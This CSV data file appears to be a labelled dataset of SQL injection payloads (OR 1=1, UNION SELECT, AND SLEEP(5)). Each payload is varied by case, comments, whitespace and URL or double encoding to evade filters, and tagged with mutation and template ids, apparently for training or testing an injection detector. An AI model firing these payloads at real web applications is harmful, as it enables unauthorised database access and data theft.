id=1'%20OR%201=1%20--,1,sqli_case_var,case_var|comment_dash_dash|ws_url_space,raw,SQLI_CASE_VAR_001,3c74c9c55addef3deaf87b9250982fa0,bced27b3cd3a9baa1eff82861092ecec,21
id%3D1%27%09aNd%091%3D1%09%2F%2A,1,sqli_case_var,comment_block_comment|ws_tab,url_encoded,SQLI_CASE_VAR_004,a4b87a7d6dc3d534b15f451e563d6a3e,07abe3b7077bdc6e5cfadd76c18455e2,32
id%253D1%2527%2BANd%2B1%253D1%2B--,1,sqli_case_var,case_var|comment_dash_dash,double_encoded,SQLI_CASE_VAR_004,8f1349d4d7c04ed098ff6fa79c20a914,fe335dfd98aed336ba56952b3e76e5d0,34
"id=1'%20UnIoN%20sElEcT%201,2%20%23",1,sqli_case_var,comment_url_hash|ws_url_space,partially_encoded,SQLI_CASE_VAR_003,c2782862a1201c5393dc7cb23ef26a39,65d6407d78ca3a9aa28b7a6a47f26c31,34
"id%3D1'+SeLeCt+1,2+--+-",1,sqli_case_var,comment_dash_dash_space|ws_plus,partially_encoded,SQLI_CASE_VAR_002,5531d4309c8ac5d73d42acb170cc3a92,57725a2f746b77b957bb17d69478b942,23
id%3D1%27+aNd+1%3D1+%3B--+-,1,sqli_case_var,comment_semicolon_comment,url_encoded,SQLI_CASE_VAR_004,8d7d02cc76d8eb3d259f3816af830eeb,36f926669bcc0cf460297c6b2c671b88,27
"id%3D1%27+SeLeCt+1,2+--",1,sqli_case_var,comment_dash_dash,partially_encoded,SQLI_CASE_VAR_002,615ca01a4173dddcc7ce8eb5f7ecfc2f,8baee8197f7cc5896dc0b046827fc073,23
id=1'%20And%201%3D1%20/%2A,1,sqli_case_var,case_var|comment_block_comment|ws_url_space,partially_encoded,SQLI_CASE_VAR_004,51f3a591b9050e38e51b7bea66fb5220,2473a5dfe5be4ab753095709cae17142,26
"id=1' SeLeCt 1,2 %23",1,sqli_case_var,comment_url_hash|ws_space,raw,SQLI_CASE_VAR_002,88d3311a7c1d96dfce0be198d3470977,1fe38ebb3e162f7c55d030211658ff45,20
id%253D1%2527%2Bunion%2Bselect%2B1%252C2%2B%252F%252A,1,sqli_case_var,case_var|comment_block_comment,double_encoded,SQLI_CASE_VAR_003,b61ea63f030b3582c0e1223689e2975e,9dd683b82d3d641541e9bdb8ec848173,53
id%253D1%2527%252520or%2525201%253D1%252520--,1,sqli_case_var,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_CASE_VAR_001,69ce42de7cf2b174dce343bacb423e26,b79420961419a56143b9c4ac9959eba7,45
id%253D1%2527%2BUNION%2BSelect%2B1%252C2%2B%253B--%2B-,1,sqli_case_var,case_var|comment_semicolon_comment,double_encoded,SQLI_CASE_VAR_003,bfb6d79f4bc68aa24b152abd6e835480,f16d48ae519f6c4537771a279d748e09,54
id%3D1%27%2BSeLeCt%2B1%2C2%2B%2523,1,sqli_case_var,comment_url_hash|ws_plus,url_encoded,SQLI_CASE_VAR_002,332d1aff66cd4b9ee83d1f7dc3d3fa82,3efc743f404b2cb90d78e8f9406408d2,34
"id%3D1%27%20Select%201,2%20--",1,sqli_case_var,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_CASE_VAR_002,2c641f20977df7ffc9cc0d4f7a95455c,b7afde9e24444e35a122ef06422f5a33,29
"id=1%27  union+ SELECT++1,2++%23",1,sqli_case_var,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_CASE_VAR_003,68aad91f368758b74a612759e38bde84,2e357546b18958a4d176714bb7c75259,32
id%3D1%27%2520oR%25201%3D1%2520--%2520-,1,sqli_case_var,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_CASE_VAR_001,e7e705846e0f7c4298a0a4205aba691e,dcb0f1e1046164e5b619dbc7ca8a65d5,39
id%253D1%2527%2B%2BSELECT%2B%2B1%252C2%2B%2B--,1,sqli_case_var,case_var|comment_dash_dash|ws_multi_space,double_encoded,SQLI_CASE_VAR_002,ae4e1761b0e704c4dbf17ed76e1b4dd2,e33240f547306ba253af5729b9d84874,46
"id=1'/**/Union/**/SELECT/**/1,2/**/--/**/-",1,sqli_case_var,case_var|comment_dash_dash_space|ws_comment_ws,raw,SQLI_CASE_VAR_003,d2ced14743805d6d59055acef1414856,b5106cf4e4d5c97b6ad3929bd1811a44,42
"id%3D1'+Select 1,2 -- -",1,sqli_case_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_CASE_VAR_002,a38d9746188ff3de9744dafd3cae8adf,421cd36e7567c206b2c9824df35d779f,23
"id%3D1%27/%2A*%2Fselect%2F%2A%2A/1,2%2F*%2A%2F--",1,sqli_case_var,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_CASE_VAR_002,b043e83f9a1b6d348a1ef39e34fa8835,fa88a5f1928dbcd781aebee6bd9dc55d,48
id%253D1%2527%2Band%2B1%253D1%2B%252523,1,sqli_case_var,case_var|comment_url_hash|ws_space,double_encoded,SQLI_CASE_VAR_004,3111770e11fcae5e34b1da144f0d797a,addb3fbbe6be2b864f322b19347f68a7,39
id%3D1' and 1=1+#,1,sqli_case_var,case_var|comment_hash|ws_space,partially_encoded,SQLI_CASE_VAR_004,6ea2ce5b6f75b5b6dbb02bf6ca869468,4f458fcd8f7524654c9e407b3a2e1ac5,17
id%3D1%27%2F%2A%2A%2FOr%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_case_var,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_CASE_VAR_001,93a7d965e5408ef3063de8759676a77d,88328f93a6b8f7257e778f7ecf1a363f,67
id%3D1%27%2F**/aNd/%2A%2A/1%3D1/%2A%2A/%23,1,sqli_case_var,comment_hash|ws_comment_ws,partially_encoded,SQLI_CASE_VAR_004,6e91e54a7ca3e173523c95e613df12cd,44c2f5b04984de7ce974b2c96d71facb,42
id%3D1'+oR+1=1+--+-,1,sqli_case_var,comment_dash_dash_space|ws_plus,partially_encoded,SQLI_CASE_VAR_001,db15708d83893e8335508b618ba7deb7,70090a60482762555f93012256cd7cf5,19
id%3D1%27%20oR%201%3D1%20%23,1,sqli_case_var,comment_url_hash|ws_url_space,partially_encoded,SQLI_CASE_VAR_001,287e352908c2e0e63fb88d0623576748,70a9b937d17d417008a97ba3475d30a2,28
"id=1' sEleCt 1,2 ;-- -",1,sqli_case_var,case_var|comment_semicolon_comment,raw,SQLI_CASE_VAR_002,8c0c427ab30d04382e22ce34cc7ee3be,1c822bf3a3219e58e1924735748034fc,22
id=1'%20oR%201%3D1%20--%20-,1,sqli_case_var,comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_CASE_VAR_001,624ff28d77430269dd913d627781c573,84fa3c9d925af03c736fbc0f604e1c19,27
id%3D1%27+select+1%2C2+--,1,sqli_case_var,case_var|comment_dash_dash,url_encoded,SQLI_CASE_VAR_002,270b956bb92f55420f8888f77ee1c7e2,08fde54a7cee9944d19bbfbe86551a06,25
id%3D1%27%2520aNd%25201%3D1%2520%2523,1,sqli_case_var,comment_url_hash|ws_url_space,url_encoded,SQLI_CASE_VAR_004,2d5d51839f136b63065acc1f5f5b5702,9839594fa9e3928db1b43ac5900beca4,37
"id=1%27%2F%2A%2A%2FUnIoN%2F*%2A/sElEcT%2F%2A%2A%2F1,2/*%2A%2F--",1,sqli_case_var,comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_CASE_VAR_003,bb81447c28457e813e3edf584b454a5a,0090a7f7ecc2a8c2b6fee8f2f9e4e699,63
"id=1'+Select+1,2+--+-",1,sqli_case_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_CASE_VAR_002,d77204f286e1b9e839b1e8d321e9a902,ea70bd2044c5a85ee59c6abf2345bfce,21
id%253D1%2527%2BaNd%2B1%253D1%2B--%2B-,1,sqli_case_var,comment_dash_dash_space,double_encoded,SQLI_CASE_VAR_004,093c47b08019bf2d976a291dc1a28709,71d3d5355c052a36ae3a4b65b055873f,38
"id%3D1%27+UNION+SELECT+1,2+%2F%2A",1,sqli_case_var,case_var|comment_block_comment,partially_encoded,SQLI_CASE_VAR_003,0b2918ba2cbf312a7765aa858e197711,2abb5cc857b3fab17bc3335db2bf49f4,33
id=1'  aND  1=1  ;--  -,1,sqli_case_var,case_var|comment_semicolon_comment|ws_multi_space,raw,SQLI_CASE_VAR_004,427f3493eb13a8a331313dc68090a789,62452fbbfeb9b9625abfd52ea6241a2b,23
id%253D1%2527%2B%2BaNd%2B%2B1%253D1%2B%2B%2523,1,sqli_case_var,comment_hash|ws_multi_space,double_encoded,SQLI_CASE_VAR_004,5e2817a0c0764deefa65161bbb860600,9d6cd611214d32bf5fc19620f761dc4e,46
id%3D1'%20Or%201%3D1%20--,1,sqli_case_var,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_CASE_VAR_001,36f2248f9ff2b7a66a73e249cd58cf3b,19dd66774425483466f31da2d13c47de,25
id%3D1%27 Or 1%3D1 %3B--+-,1,sqli_case_var,case_var|comment_semicolon_comment,partially_encoded,SQLI_CASE_VAR_001,f6da8e2b0475c64f1f5b3e212b56167b,96ffa49705b3d412be67ddbd8b8e9a19,26
id=1%27+Or+1=1 --+-,1,sqli_case_var,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_CASE_VAR_001,7c0cc73e198aa414ea24c55b3e5a5458,d97fca0ce94af2d65c2b60cba96eeee3,19
id%3D1%27+UnIOn+sElEcT+1%2C2+%2F%2A,1,sqli_case_var,case_var|comment_block_comment,url_encoded,SQLI_CASE_VAR_003,9bd692c49aa245975d52f35384ea1b74,66ecb7a8788c94d0a6751a5480be8806,35
id%253D1%2527%252F%252A%252A%252FOr%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%252F%252A,1,sqli_case_var,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_CASE_VAR_001,eb2e43b3de2c381f7b50aa94506837b1,f1ecb280425f72a8b4ad5aa85ada4db4,92
id%3D1%27+And 1=1+%2F*,1,sqli_case_var,case_var|comment_block_comment,partially_encoded,SQLI_CASE_VAR_004,c54867bc33b8230d0ce1d710e0828f85,29edeae39793e4c01b5486220af9632a,22
id%3D1'/%2A*%2For%2F**%2F1%3D1%2F**%2F--/%2A%2A%2F-,1,sqli_case_var,case_var|comment_dash_dash_space|ws_mixed_ws,partially_encoded,SQLI_CASE_VAR_001,45f52630a48ea7db214d7e6a5c5a6fef,f16722a74caafa4c47d21f4c6600a537,51
id%253D1%2527%252F%252A%252A%252FUnIoN%252F%252A%252A%252FsElEcT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252F%252A,1,sqli_case_var,comment_block_comment|ws_mixed_ws,double_encoded,SQLI_CASE_VAR_003,4db09c87496a307f34380ee7a4a2b4cb,2027b16f3f28b78c7874632af8e65895,121
id%3D1%27 and+1%3D1+%23,1,sqli_case_var,case_var|comment_url_hash,partially_encoded,SQLI_CASE_VAR_004,a0eb7f1bcfb71871890a5870a4c34aae,1dc08da8079a0b75e70454d78549ecf5,23
"id%3D1' uniON+SELECT+1,2 %23",1,sqli_case_var,case_var|comment_url_hash,partially_encoded,SQLI_CASE_VAR_003,5a97af12d99c587eade9cfffa1adbfa7,3de096fd41d53b08791b530bad39e2f3,28
id%253D1%2527%252BoR%252B1%253D1%252B--,1,sqli_case_var,comment_dash_dash|ws_plus,double_encoded,SQLI_CASE_VAR_001,402f76bfde537e9b2e2797892760ef97,4754780ab1d5998dc3cf6cc8e2f744b7,39
id%3D1'++or  1=1+ %23,1,sqli_case_var,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_CASE_VAR_001,a6ab2b134c532f6c222041a64c9b147d,1601e912b1086b48d3b15b3fd58a1f69,21
id%253D1%2527%2BAnd%2B1%253D1%2B%252F%252A,1,sqli_case_var,case_var|comment_block_comment,double_encoded,SQLI_CASE_VAR_004,6cdb08c4e061ad4ebdc934f78fde3c64,68bfce0cac072d535080cb361edea73b,42
id%3D1' OR 1=1+--+-,1,sqli_case_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_CASE_VAR_001,15944065ee1ccf1a6f74009d0717ffce,abccf93c4e48814ec29cfc5e80e03bdd,19
id%253D1%2527%252BoR%252B1%253D1%252B%252F%252A,1,sqli_case_var,comment_block_comment|ws_plus,double_encoded,SQLI_CASE_VAR_001,b6278318d7b898c00bbf29d6401eac7f,7cd525a760779f304f68689377b7585c,47
id%3D1%27%2F%2A%2A%2FSeLeCt%2F%2A%2A%2F1%2C2%2F%2A%2A%2F--,1,sqli_case_var,comment_dash_dash|ws_comment_ws,url_encoded,SQLI_CASE_VAR_002,0019cb0acfe9dab5e84e62c9edb04646,c0ff407fa95e6aa5259d7d640ecd3bda,58
id%3D1%27   OR+++1%3D1 + #,1,sqli_case_var,case_var|comment_hash|ws_mixed_ws,partially_encoded,SQLI_CASE_VAR_001,cd14fce5e5f443501fd09034df8f9c7c,284be866635305f758f743762a4558ff,26
"id%3D1%27%20union%20SELECT%201,2%20--%20-",1,sqli_case_var,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_CASE_VAR_003,99245b73723cd95bde8ce7bc8508b725,8e6c3d958c404ad9971f72724efbdabd,41
"id=1%27%2F%2A%2A/UnIoN%2F%2A%2A/sElEcT%2F*%2A%2F1,2%2F%2A*%2F%23",1,sqli_case_var,comment_url_hash|ws_comment_ws,partially_encoded,SQLI_CASE_VAR_003,14cbe655bcfd9ea51d67e20b60cfdb88,93457d93e98ed7da4789522ecde80238,64
id%3D1%27%2F%2A%2A%2Fand%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%23,1,sqli_case_var,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_CASE_VAR_004,9fbbe26f97724df7aaf56034b066b24d,7bc033d74c5ef0f7d341f9f45e929a22,56
"id=1%27++sElecT++1,2++%2F*",1,sqli_case_var,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_CASE_VAR_002,a36ff4b842f8c869de688ffc6e932acd,4ed746086b67f6bf0489cf69f315e20f,26
id=1'/**/Or/**/1=1/**/--/**/-,1,sqli_case_var,case_var|comment_dash_dash_space|ws_comment_ws,raw,SQLI_CASE_VAR_001,37a65d9a6c11f4565bb4ef5c75d8113b,d2ce2a429a6fe70d88548c20cba99fd2,29
id%253D1%2527%2BOr%2B1%253D1%2B--%2B-,1,sqli_case_var,case_var|comment_dash_dash_space,double_encoded,SQLI_CASE_VAR_001,a0b01ca35a42693f462213cf5f2c4f7c,6174d41c7aac3e4d9a22822e36147e61,37
id%253D1%2527%2BSELECT%2B1%252C2%2B%252F%252A,1,sqli_case_var,case_var|comment_block_comment|ws_space,double_encoded,SQLI_CASE_VAR_002,d58598271875e3bfcc960ffe48023784,ac27ba716c2a623d12d9056b9f00b303,45
id%253D1%2527%252520UNioN%252520SELECT%2525201%252C2%252520%252523,1,sqli_case_var,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_CASE_VAR_003,e3f8509d6edc20e3e02e26ecbb256bdf,bd0b46e4dc543d5d05a7cd94d4ecf68f,66
id%3D1'+aND+1=1+%3B-- -,1,sqli_case_var,case_var|comment_semicolon_comment,partially_encoded,SQLI_CASE_VAR_004,bbf6c1de5df4c21c4d1df1ddfb2fa132,da3663cba177dcc7db5667f4ad130299,23
id%253D1%2527%252F%252A%252A%252FSelEcT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_case_var,case_var|comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_CASE_VAR_002,cd25522ff0f91a17dfd0d8b88bfbb5e5,e2b9269955e0bb1b0dba8519701a5648,114
id%253D1%2527%252520SeLeCt%2525201%252C2%252520%252F%252A,1,sqli_case_var,comment_block_comment|ws_url_space,double_encoded,SQLI_CASE_VAR_002,536ad1bf8821d8af405233dc0587d5d8,153b0bf082061c79a4c0eb03154b6418,57
"id=1'%20SeLeCt%201,2%20#",1,sqli_case_var,comment_hash|ws_url_space,raw,SQLI_CASE_VAR_002,03cc61f38e76426cc60bc33ee47133c3,2d174c2e8d409246e6b206c2023e7787,24
id%3D1'+or 1=1 %23,1,sqli_case_var,case_var|comment_url_hash,partially_encoded,SQLI_CASE_VAR_001,1dad2dac0b8bef4687363b50060c1006,3565e7b6a1de2bc349888c896c7a779f,18
id%253D1%2527%2BSELECT%2B1%252C2%2B%2523,1,sqli_case_var,case_var|comment_hash,double_encoded,SQLI_CASE_VAR_002,a326c22fa97d689c02d227ab7c2679cb,0ab6a1f4ff53dfa6c942066d487395ce,40
id%253D1%2527%252BoR%252B1%253D1%252B%253B--%252B-,1,sqli_case_var,comment_semicolon_comment|ws_plus,double_encoded,SQLI_CASE_VAR_001,44a9300c0a8c302d36e096fc799039a7,9e4d8b40628956df98ade94ee2ddcaf0,50
"id=1'  SeLeCt  1,2  --",1,sqli_case_var,comment_dash_dash|ws_multi_space,raw,SQLI_CASE_VAR_002,6bd9c81440a259fabcf74bd3c9ba7492,97a509f29f5f1c7f6c1a0f3d75314392,22
search=1'%20OR%201=1#/*,1,sqli_param_var,case_var|comment_block_comment|ws_url_space,raw,SQLI_PARAM_VAR_001,f9cdc6c4a18fe8733c8cf90f55b9d7a8,e76ffe11153ac6b8e2ed38039e764acd,23
cat%3Delectronics%27+union+select+1%2C2%23,1,sqli_param_var,case_var,url_encoded,SQLI_PARAM_VAR_003,077446fca56d7710c0119dea94c274b4,a4cf9a827429d0ef16dff3fa2857e445,42
page%3D1%27%2BAND%2B1%3D1%23%26sort%3Dasc--,1,sqli_param_var,case_var|comment_dash_dash|ws_plus,url_encoded,SQLI_PARAM_VAR_002,103668d42ac015e4c16bc8a6a324ef33,23c48879bed2c2ba0964dac6fdba01e0,43
query%3Dbook%27%2F%2A%2A%2Fand%2F%2A%2A%2FSLEEP%285%29%23,1,sqli_param_var,case_var|ws_comment_ws,url_encoded,SQLI_PARAM_VAR_004,e0d3d9ef15f98d053cc450713e965794,968db85973f214568b3a85cca58184c2,57
page=1'+AND+1%3D1%23&sort=asc,1,sqli_param_var,ws_plus,partially_encoded,SQLI_PARAM_VAR_002,8a434c20a1056d791cecf1ad734919d4,e4f804f812b9bf0696ca13254dd40ee1,29
filter%3Dactive%27++and++%27a%27%3D%27a,1,sqli_param_var,case_var|ws_multi_space,url_encoded,SQLI_PARAM_VAR_005,e695aa763b580cad26ac6784a11bfeb1,1806a48c3fcf19fa87970d4c9a792d50,39
filter%3Dactive%27+++AND+++%27a%27%3D%27a%23,1,sqli_param_var,comment_hash|ws_mixed_ws,url_encoded,SQLI_PARAM_VAR_005,dac20be4394b5aa9ebb0e05e709db14e,183d2fa6a8025653a3eec0ffd7e8914a,44
filter%253Dactive%2527%2BAND%2B%2527a%2527%253D%2527a%252F%252A,1,sqli_param_var,comment_block_comment,double_encoded,SQLI_PARAM_VAR_005,84eb6e94c51d64f17edaaac41e667921,42d95f930008c3bad643128d43f7630c,63
cat%3Delectronics%27+++uniOn+++SELECT+++1%2C2%23--,1,sqli_param_var,case_var|comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_PARAM_VAR_003,557835f18a808fa674410848578d0698,07d4bfd893c43f46f3fe1376436fcb37,50
"cat=electronics' union SELECT 1,2#%23",1,sqli_param_var,case_var|comment_url_hash,raw,SQLI_PARAM_VAR_003,a934f083e407898b378e6a8ed21e27ff,15693619d96104769d268835ee7b79ee,37
search%3D1%27%2F%2A%2A%2For/%2A*%2F1%3D1%23--%2F%2A%2A/-,1,sqli_param_var,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_PARAM_VAR_001,407584433509573ec449622a04cf9638,496c61a239dbe230a6f8516bb3dd00bd,56
"cat%3Delectronics%27+Union Select+1,2%23--",1,sqli_param_var,case_var|comment_dash_dash,partially_encoded,SQLI_PARAM_VAR_003,8462487169d0093f0275a516a3ec253e,d5ecd5a055539e7f79a67ed55fcd23bd,42
"cat=electronics' UNION SELECT 1,2#-- -",1,sqli_param_var,comment_dash_dash_space,raw,SQLI_PARAM_VAR_003,4c34bbb4e2bce36b06b78ad3f7271f9e,725dcb65d8ed82f1be9d3543ec498806,38
search=1'  oR  1=1#,1,sqli_param_var,case_var|ws_multi_space,raw,SQLI_PARAM_VAR_001,abcb849d0a3af356266afff6fd7b89be,7b00028869cbe40c167bbbaac194c2aa,19
page%3D1%27+and+1%3D1%23%26sort%3Dasc%3B--+-,1,sqli_param_var,case_var|comment_semicolon_comment,url_encoded,SQLI_PARAM_VAR_002,378d523355c7971f63bd9699553d7d1e,910f237efb51880317dc37d745a84d73,44
query%253Dbook%2527%252520AND%252520SLEEP%25285%2529%2523,1,sqli_param_var,ws_url_space,double_encoded,SQLI_PARAM_VAR_004,9661615e3edb31b90afa112da5400b8c,120f9f29cbb0fff06207fd42d92fcfd9,57
filter=active'  And  'a'='a--  -,1,sqli_param_var,case_var|comment_dash_dash_space|ws_multi_space,raw,SQLI_PARAM_VAR_005,928e2f150428fa24fb8cd1eb3973c845,931c1de4f545d0d05d11c891b2efa1e8,32
search%3D1'%20OR%201%3D1#--%20-,1,sqli_param_var,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_PARAM_VAR_001,99ab78cdf8585a8dc6fca5af2dc5bfad,5c6d00a6754dd0a98deedaf4557456ed,31
filter%3Dactive' And 'a'%3D%27a,1,sqli_param_var,case_var|ws_space,partially_encoded,SQLI_PARAM_VAR_005,1089db62fd4bdb4cb5fe090f086f1ee3,400299e98764b28173d3226dd704a03e,31
page%253D1%2527%2B%2BAND%2B%2B1%253D1%2523%2526sort%253Dasc,1,sqli_param_var,ws_multi_space,double_encoded,SQLI_PARAM_VAR_002,2c3c45360759ba3d1c244b2dc63ed367,2a520fd6d2d0163f9629edf4872012c0,59
filter%253Dactive%2527%2BANd%2B%2527a%2527%253D%2527a--%2B-,1,sqli_param_var,case_var|comment_dash_dash_space,double_encoded,SQLI_PARAM_VAR_005,03cdc860eb00e0159fa8e52c13ddedaf,b10378fc5564ba7ef7bf51bc2fdb205d,59
search%253D1%2527%2509Or%25091%253D1%2523--,1,sqli_param_var,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_PARAM_VAR_001,a44fe27a889f4c6b2b5d35050f4cbe45,be7998e173936203a2066c5d42cad90b,43
filter%3Dactive%27+AND+%27a%27%3D%27a,1,sqli_param_var,standard,url_encoded,SQLI_PARAM_VAR_005,f9d86cec2642247835063f8d7d4cfb76,5bebba1e4e8e71e28531b3b45809c848,37
cat%3Delectronics%27+UNION+SELeCT+1%2C2%23%3B--+-,1,sqli_param_var,case_var|comment_semicolon_comment|ws_space,url_encoded,SQLI_PARAM_VAR_003,0cddcb6532c9dfb16d09c11460ee2511,0a4aedf2e3e6d897ed91ca40d2483605,49
search%3D1%27%2520OR%25201%3D1%23%2F%2A,1,sqli_param_var,comment_block_comment|ws_url_space,url_encoded,SQLI_PARAM_VAR_001,10199ee066b08d18c6c569501d14b1e7,a5fb5db87b95317e43543ce06b68338c,39
cat%253Delectronics%2527%252Bunion%252Bselect%252B1%252C2%2523--%252B-,1,sqli_param_var,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_PARAM_VAR_003,503ba70c3b9833486104f6aa003c6780,bba036d5319690a08285bb6d5b68ea5e,70
filter=active' And 'a'='a;-- -,1,sqli_param_var,case_var|comment_semicolon_comment,raw,SQLI_PARAM_VAR_005,a6cc62f3ba582169b63011740e41e524,a6c06c0b19b8965462d17b695ce7dc42,30
search%3D1%27+OR+1%3D1%23%2523,1,sqli_param_var,comment_url_hash,url_encoded,SQLI_PARAM_VAR_001,f9e8812137a680074d33145449f371c0,7e62533443c2289de8e7e853801a9a14,30
query=book'	And	SLEEP(5)#/*,1,sqli_param_var,case_var|comment_block_comment|ws_tab,raw,SQLI_PARAM_VAR_004,7357c25518691eb8665c03c03cb9d3bf,c482c1d90e76614e1717ffd2a7adc73e,27
filter%3Dactive%27+AND+%27a%27%3D%27a--,1,sqli_param_var,comment_dash_dash,url_encoded,SQLI_PARAM_VAR_005,6eca612736be54d7cbd9b375eed962ae,25dd73027c49aca1c15b0c0e73fdd568,39
"cat=electronics'/**/UNION/**/SELECT/**/1,2#--",1,sqli_param_var,comment_dash_dash|ws_comment_ws,raw,SQLI_PARAM_VAR_003,fe2eca823a58e1c9796078d74d0959a3,f2ba7ca1693949dcbc5206d6eae90487,45
query%253Dbook%2527%2B%2Band%2B%2BSLEEP%25285%2529%2523,1,sqli_param_var,case_var|ws_multi_space,double_encoded,SQLI_PARAM_VAR_004,d71ac8632513d75197be271214c63b9c,c3f032163cf60d6409e42b960a42bf2c,55
query%3Dbook%27+AND+SLEEP%285%29%23,1,sqli_param_var,standard,url_encoded,SQLI_PARAM_VAR_004,38521a1fd0507cf4b02efae329e71bcf,3e3409081d45da556390d6f912c95245,35
page=1'/**/AND/**/1=1#&sort=asc--/**/-,1,sqli_param_var,comment_dash_dash_space|ws_comment_ws,raw,SQLI_PARAM_VAR_002,00f2d56eb223f75327710d73b6b1865e,1c0477096689d82fcd9a7e16a7821393,38
query%3Dbook'+and+SLEEP(5)%23%2F%2A,1,sqli_param_var,case_var|comment_block_comment,partially_encoded,SQLI_PARAM_VAR_004,96ae7e6a22198f848de475dae4752bbd,7b1537ed0740d36eeb01b5619dfd76c1,35
search%3D1%27%2520or%25201%3D1%23,1,sqli_param_var,case_var|ws_url_space,url_encoded,SQLI_PARAM_VAR_001,996aa27acea55feb394ba604616d4675,edc80c18c516d12398d3bb3f4a643724,33
search%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%23,1,sqli_param_var,ws_comment_ws,url_encoded,SQLI_PARAM_VAR_001,a698324231162d9f444b269dbdee9b9a,0b231fbdbc22be5beba66d3ed507eab9,47
page=1' AND 1=1#&sort=asc,1,sqli_param_var,standard,raw,SQLI_PARAM_VAR_002,e3e23861f6ffb6fbcb16d28584a63dfa,898577db5d13e912eec7c04373aa63d4,25
page%253D1%2527%2Band%2B1%253D1%2523%2526sort%253Dasc,1,sqli_param_var,case_var,double_encoded,SQLI_PARAM_VAR_002,2b6d7fb1d7cc5c8c7056b0238ac8d229,525c5002cbaa52e994a03e7579da5b33,53
page%253D1%2527%2BAND%2B1%253D1%2523%2526sort%253Dasc%252523,1,sqli_param_var,case_var|comment_url_hash,double_encoded,SQLI_PARAM_VAR_002,f870dae7ce2051108ffa971fa80c1fdf,484cf4b3ba390bb98a16f8d163f6d7a7,60
query%3Dbook%27+AND+SLEEP%285%29%23%2F%2A,1,sqli_param_var,comment_block_comment,url_encoded,SQLI_PARAM_VAR_004,9ef0b5e7749063020382270319958041,ea941084339a52ec436b5edaf1f41d8c,41
cat%3Delectronics%27+Union+SELECT+1%2C2%23--+-,1,sqli_param_var,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_PARAM_VAR_003,ec8b8e0e4d8be99a4797e9597c644783,dcbb242155e78ac4118232d05528aced,46
filter=active%27+AND %27a'%3D%27a,1,sqli_param_var,case_var,partially_encoded,SQLI_PARAM_VAR_005,def56f107ed0d54e1c553b335f32e7aa,52fd0aca35da1c814782b1d118be6334,33
cat%3Delectronics%27++UNION++SELECT++1%2C2%23,1,sqli_param_var,ws_multi_space,url_encoded,SQLI_PARAM_VAR_003,362a8907a8e0442ac65bc42daf583d9c,812eb616e209798a6843ccc3fbba13b8,45
filter%3Dactive%27%09And%09%27a%27%3D%27a,1,sqli_param_var,case_var|ws_tab,url_encoded,SQLI_PARAM_VAR_005,f0e50222c4814bb608b86f4b7eaafe6c,ab9f1f6240cf7d9715b95b79c9bd8119,41
"cat=electronics%27+UNION SELECT 1,2#%2F%2A",1,sqli_param_var,comment_block_comment,partially_encoded,SQLI_PARAM_VAR_003,5a1da25b34fc97379f8f663324c02ed2,d72163935b1e74f4a5d7e58142dd0021,42
"cat%3Delectronics%27 + union  +Select + 1,2%23",1,sqli_param_var,case_var|ws_mixed_ws,partially_encoded,SQLI_PARAM_VAR_003,41d759755808a92e47e33cf079821bb1,24d858b7edec75e306f4a7e59fe62960,46
search%3D1%27+Or+1%3D1%23,1,sqli_param_var,case_var|ws_space,url_encoded,SQLI_PARAM_VAR_001,541ced93dab8232aa9138c9447678d6e,0709fa60870d6c0b0df1d486392fb2a9,25
filter=active%27+AND 'a'%3D'a%3B-- -,1,sqli_param_var,case_var|comment_semicolon_comment,partially_encoded,SQLI_PARAM_VAR_005,5792d2c4e859049c2cdf84184362be20,efe7cd1fca890b4c9e6f6312a234f048,36
query%253Dbook%2527%252BAnd%252BSLEEP%25285%2529%2523%253B--%252B-,1,sqli_param_var,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_PARAM_VAR_004,fca0efeb9659028e2cf83edffe459462,34029aa3b2652d9b43b31fbefb901af5,66
search%253D1%2527%2509OR%25091%253D1%2523,1,sqli_param_var,ws_tab,double_encoded,SQLI_PARAM_VAR_001,667c3d0b6b8ee84a957d66383cb3b99c,46466e7c25be157bd3d2208c42a45327,41
filter=active%27/%2A*%2FANd%2F%2A*/'a%27%3D%27a,1,sqli_param_var,case_var|ws_comment_ws,partially_encoded,SQLI_PARAM_VAR_005,7fb0509f22b11eec07952ca400d58015,b4266960983f4622be07b8f099ba5fc7,47
query=book'+AND+SLEEP(5)#--,1,sqli_param_var,comment_dash_dash|ws_plus,raw,SQLI_PARAM_VAR_004,ebfed294e939e999ea92bac52dea1791,2a142b4912be90bf88d356bf5ef1f324,27
cat%253Delectronics%2527%2B%2BUNION%2B%2BSELECT%2B%2B1%252C2%2523,1,sqli_param_var,ws_multi_space,double_encoded,SQLI_PARAM_VAR_003,c53fe01ce272f5c12897c0da092a1ead,d11c56f480b5124569ea9414b0064880,65
